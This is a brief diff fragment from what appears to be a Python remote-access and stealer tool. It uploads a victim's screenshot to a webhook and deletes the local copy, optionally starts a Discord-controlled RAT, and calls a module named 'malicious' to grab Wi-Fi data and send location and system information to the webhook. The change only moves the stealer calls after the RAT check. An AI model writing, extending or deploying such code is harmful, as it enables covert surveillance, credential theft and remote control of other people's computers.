@@ -944,8 +944,9 @@ files = {"screenshot": open("screenshot.png", "rb")}
 requests.post(webhook, files=files)
 files["screenshot"].close()
 os.remove("screenshot.png")
-malicious.wifigr(webhook=webhook)
-_webh.locations_webhook(ii.global_info())
 
 if cc.get_discord_rat() is True:
     rat.run_rat()
+
+malicious.wifigr(webhook=webhook)
+_webh.locations_webhook(ii.global_info())
